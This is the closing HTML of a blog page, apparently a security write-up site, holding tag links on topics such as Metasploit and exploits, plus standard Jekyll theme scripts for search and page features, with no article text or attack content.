        <a class="post-tag btn btn-outline-primary" href="/octority/tags/reverse-engineering/">reverse-engineering</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/octority/tags/metasploit/">metasploit</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/octority/tags/cc/">cc</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/octority/tags/couchdb/">couchdb</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/octority/tags/dll-injection/">dll-injection</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/octority/tags/exploit/">exploit</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/octority/tags/firefox/">firefox</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/octority/tags/raspberry-pi/">raspberry-pi</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js"></script>






<script defer src="/octority/assets/js/dist/post.min.js"></script>






    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/octority/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

